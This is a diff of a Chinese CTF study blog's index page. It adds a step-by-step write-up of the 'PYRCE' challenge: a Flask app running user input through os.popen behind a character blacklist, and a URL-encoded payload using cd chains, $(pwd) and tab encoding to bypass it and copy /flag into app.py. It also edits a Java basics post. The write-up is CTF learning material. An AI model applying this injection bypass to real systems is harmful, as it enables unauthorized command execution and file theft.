@@ -129,7 +129,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">52</span>
+          <span class="site-state-item-count">53</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -300,6 +300,137 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/09/NSSRound-V-Team-PYRCE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_2.gif">
+      <meta itemprop="name" content="温柔刀">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CTF学习笔记">
+      <meta itemprop="description" content="JNU_WEB">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | CTF学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/03/09/NSSRound-V-Team-PYRCE/" class="post-title-link" itemprop="url">[NSSRound#V Team]PYRCE</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-03-09 13:43:46 / 修改时间：14:35:18" itemprop="dateCreated datePublished" datetime="2025-03-09T13:43:46+08:00">2025-03-09</time>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+    <span class="post-meta-item-icon">
+      <i class="far fa-comment"></i>
+    </span>
+    <span class="post-meta-item-text">Waline：</span>
+  
+    <a title="waline" href="/2025/03/09/NSSRound-V-Team-PYRCE/#waline" itemprop="discussionUrl">
+      <span class="post-comments-count waline-comment-count" data-path="/2025/03/09/NSSRound-V-Team-PYRCE/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>492</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>2 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入必要的库</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response</span><br><span class="line"><span class="keyword">import</span> uuid  <span class="comment"># 此导入在代码中未使用，可以考虑移除</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化 Flask 应用</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个简单的 Web 应用防火墙（WAF）函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">rce</span>):</span><br><span class="line">    <span class="comment"># 定义黑名单字符</span></span><br><span class="line">    black_list = <span class="string">&#x27;01233456789un/|&#123;&#125;*!;@#\n~\&#x27;\&quot;&gt;&lt;=+-_ &#x27;</span></span><br><span class="line">    <span class="comment"># 遍历黑名单字符</span></span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> rce:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义根路由，处理 GET 请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># 检查请求参数中是否包含 &quot;Ňśś&quot;</span></span><br><span class="line">    nss = request.args.get(<span class="string">&quot;Ňśś&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> nss:</span><br><span class="line">        <span class="comment"># 调用 WAF 函数检查输入是否合法</span></span><br><span class="line">        <span class="keyword">if</span> waf(nss):</span><br><span class="line">            <span class="comment"># 如果合法，执行系统命令</span></span><br><span class="line">            os.popen(nss)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 如果不合法，返回 &quot;waf&quot;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;waf&quot;</span></span><br><span class="line">    <span class="comment"># 返回 &quot;/source&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/source&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 /source 路由，处理 GET 请求</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    <span class="comment"># 读取当前文件（app.py）的内容</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        src = f.read()</span><br><span class="line">    <span class="keyword">return</span> src</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主程序入口</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 运行 Flask 应用</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>网上的wp看着云里雾里的，写一个循序渐进版本的</p>
+<p>首先是os.popen(nss),没有read()，没有回显</p>
+<p>所以用&#x2F;source来回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /flag app.py</span><br></pre></td></tr></table></figure>
+
+<p>那么&#x2F;被过滤了，怎么办？</p>
+<p>想到在根目录的时候pwd就是&#x2F;</p>
+<p>所以先回到根目录 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd..&amp;&amp;cd..&lt;不知道多少个&gt;&amp;&amp;cd..</span><br></pre></td></tr></table></figure>
+
+<p>不知道为啥网上的wp是三个点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;</span><br></pre></td></tr></table></figure>
+
+<p><strong>前一个命令成功后</strong>，才执行下一个</p>
+<p>到根目录了以后可以echo &#x2F;flag了</p>
+<p>把&#x2F;替换为$(pwd)</p>
+<h3 id="pwd-是什么？"><a href="#pwd-是什么？" class="headerlink" title="$(pwd) 是什么？"></a><strong><code>$(pwd)</code> 是什么？</strong></h3><p><code>$(pwd)</code> 是 <strong>命令替换（Command Substitution）</strong> 的一种写法，它的作用是：<br> <strong>执行 <code>pwd</code> 命令，并把它的输出结果替换到当前位置</strong>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $(pwd)flag</span><br></pre></td></tr></table></figure>
+
+<p>所以就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp $(cd .. &amp;&amp;cd .. &lt;不知道多少个&gt;&amp;&amp;cd..&amp;&amp;echo $(pwd)flag) app.py</span><br></pre></td></tr></table></figure>
+
+<p>空格全部用%09替换</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp%09$(cd%09..%09&amp;&amp;cd%09..%09&amp;&amp;cd%09..%09&amp;&amp;cd%09..%09&amp;&amp;cd%09..%09&amp;&amp;cd%09..%09&amp;&amp;cd%09..%09&amp;&amp;cd%09..%09&amp;&amp;cd%09..&amp;&amp;echo%09$(pwd)flag)%09app.py</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp%09%24(cd%09..%26%26cd%09..%26%26cd%09..%26%26cd%09..%26%26cd%09..%26%26cd%09..%26%26cd%09..%26%26cd%09..%26%26echo%09%24%28pwd%29flag)%09app.py</span><br></pre></td></tr></table></figure>
+
+<p>再访问&#x2F;source<br>成功</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/08/Java%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B%E7%9F%A5%E8%AF%86%E7%82%B9%E7%B2%BE%E9%80%89%E9%9B%86/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -330,7 +461,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2025-03-08 22:49:32 / 修改时间：22:53:50" itemprop="dateCreated datePublished" datetime="2025-03-08T22:49:32+08:00">2025-03-08</time>
+      <time title="创建时间：2025-03-08 22:49:32 / 修改时间：22:58:43" itemprop="dateCreated datePublished" datetime="2025-03-08T22:49:32+08:00">2025-03-08</time>
     </span>
 
   
@@ -354,14 +485,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>269</span>
+      <span>558</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
+      <span>2 分钟</span>
     </span>
 </div>
 
@@ -382,12 +513,20 @@
 <ul>
 <li><p><strong>对象</strong>：对象是类的一个实例，有状态和行为。例如，一条狗是一个对象，它的状态有：颜色、名字、品种；行为有：摇尾巴、叫、吃等。</p>
 </li>
-<li><p><strong>类</strong>：类是一个模板，它描述一类对象的行为和状态。</p>
+<li><p><strong>类</strong>：类是一个模板，它描述一类对象的行为和状态。(类名的首字母应该大写。如果类名由若干单词组成，那么每个单词的首字母应该大写，例如 <strong>MyFirstJavaClass</strong>)</p>
 </li>
-<li><p><strong>方法</strong>：方法就是行为，一个类可以有很多方法。逻辑运算、数据修改以及所有动作都是在方法中完成的。</p>
+<li><p><strong>方法</strong>：方法就是行为，一个类可以有很多方法。逻辑运算、数据修改以及所有动作都是在方法中完成的。(所有的方法名都应该以小写字母开头)</p>
 </li>
 <li><p><strong>实例变量</strong>：每个对象都有独特的实例变量，对象的状态由这些实例变量的值决定。</p>
 </li>
+</ul>
+<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>编写 Java 程序时，应注意以下几点：</p>
+<ul>
+<li><strong>大小写敏感</strong>：Java 是大小写敏感的，这就意味着标识符 Hello 与 hello 是不同的。</li>
+<li><strong>类名</strong>：对于所有的类来说，类名的首字母应该大写。如果类名由若干单词组成，那么每个单词的首字母应该大写，例如 <strong>MyFirstJavaClass</strong> 。</li>
+<li><strong>方法名</strong>：所有的方法名都应该以小写字母开头。如果方法名含有若干单词，则后面的每个单词首字母大写。</li>
+<li><strong>源文件名</strong>：源文件名必须和(主)类名相同。当保存文件的时候，你应该使用类名作为文件名保存（切记 Java 是大小写敏感的），文件名的后缀为 <strong>.java</strong>。（如果文件名和类名不相同则会导致编译错误）。</li>
+<li><strong>主方法入口</strong>：所有的 Java 程序由 <strong>public static void main(String[] args)</strong> 方法开始执行。</li>
 </ul>
 
       
@@ -1209,122 +1348,6 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/05/%E5%85%88%E5%B0%84%E7%AE%AD%E5%86%8D%E7%94%BB%E9%9D%B6%E7%9A%84%E5%BC%8A%E7%AB%AF%E5%87%B8%E6%98%BE/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar_2.gif">
-      <meta itemprop="name" content="温柔刀">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CTF学习笔记">
-      <meta itemprop="description" content="JNU_WEB">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | CTF学习笔记">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2025/03/05/%E5%85%88%E5%B0%84%E7%AE%AD%E5%86%8D%E7%94%BB%E9%9D%B6%E7%9A%84%E5%BC%8A%E7%AB%AF%E5%87%B8%E6%98%BE/" class="post-title-link" itemprop="url">先射箭再画靶的弊端凸显</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2025-03-05 21:37:20" itemprop="dateCreated datePublished" datetime="2025-03-05T21:37:20+08:00">2025-03-05</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-03-07 21:39:20" itemprop="dateModified" datetime="2025-03-07T21:39:20+08:00">2025-03-07</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%8F%8D%E6%80%9D/" itemprop="url" rel="index"><span itemprop="name">反思</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-    <span class="post-meta-item-icon">
-      <i class="far fa-comment"></i>
-    </span>
-    <span class="post-meta-item-text">Waline：</span>
-  
-    <a title="waline" href="/2025/03/05/%E5%85%88%E5%B0%84%E7%AE%AD%E5%86%8D%E7%94%BB%E9%9D%B6%E7%9A%84%E5%BC%8A%E7%AB%AF%E5%87%B8%E6%98%BE/#waline" itemprop="discussionUrl">
-      <span class="post-comments-count waline-comment-count" data-path="/2025/03/05/%E5%85%88%E5%B0%84%E7%AE%AD%E5%86%8D%E7%94%BB%E9%9D%B6%E7%9A%84%E5%BC%8A%E7%AB%AF%E5%87%B8%E6%98%BE/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>197</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>VNCTF是对我的网安学习很大助益的比赛，因为烂成绩开始反思自己的学习方式，重建了自己的博客。因为学生姓名管理系统考的bottle框架，还有一道sqlite，再加上过去正式比赛爆零的经历，我觉得自己在实战，实操方面非常欠缺。</p>
-<p>如果黑盒做题不知道什么漏洞，怎么确定是什么漏洞？语句是什么？</p>
-<p>平时在NSSCTF写的题，有标签作为铺垫，卡住了马上搜考点，看题解。这种爱拄拐杖的做题方式其实间接地削弱了思考能力。虽然很讨厌没有思路，做题卡到一半，但是实战中这种情况非常多见，应该磨炼。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
     <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
@@ -1349,14 +1372,14 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">21k</span>
+    <span title="站点总字数">22k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">1:17</span>
+    <span title="站点阅读时长">1:20</span>
   </span>
 </div>
 
